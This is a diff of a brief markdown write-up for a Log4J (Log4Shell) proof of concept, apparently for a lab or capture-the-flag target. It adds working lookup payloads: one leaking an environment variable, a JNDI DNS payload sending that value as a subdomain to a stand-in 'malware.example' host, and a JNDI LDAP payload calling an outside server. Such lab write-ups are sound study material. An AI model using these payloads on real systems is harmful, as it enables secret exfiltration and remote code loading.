@@ -1,10 +1,28 @@
 # Write up for Log4J POC
 
-write up for Log4J POC.
+write up for Log4J POC. Web at `http://172.25.0.21:39110/`.
 
-`${jndi:dns://172.26.0.1:53/${env:flag}.malware.example}`
 
-`${jndi:ldap://172.25.64.20:10389/uid=1001,dc=example,dc=com}`
+## Log4J Example
+
+```
+req at ${date:MM-dd-yyyy} sys running on ${env:HOSTNAME}.
+${env:flag}
+```
+
+## DNS
+
+```
+logread -f | grep malware\.example
+${jndi:dns://172.26.0.1:53/${env:flag}.malware.example}
+```
+
+## LDAP
+
+```
+
+${jndi:ldap://172.25.64.20:10389/uid=1001,dc=example,dc=com}
+```
 
 ## Bibliography
 
